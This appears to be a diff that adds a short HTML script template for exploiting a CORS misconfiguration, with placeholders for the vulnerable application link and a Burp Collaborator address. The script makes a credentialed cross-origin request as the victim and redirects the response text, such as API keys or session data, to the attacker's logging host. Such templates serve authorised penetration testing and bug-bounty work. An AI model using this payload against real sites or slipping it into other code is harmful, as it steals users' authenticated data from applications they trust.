@@ -1,0 +1,13 @@
+<script>
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','<CORS vulnerable application link>',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='<Give burp collaborator client address>/log?key='+this.responseText;
+};
+
+</script>
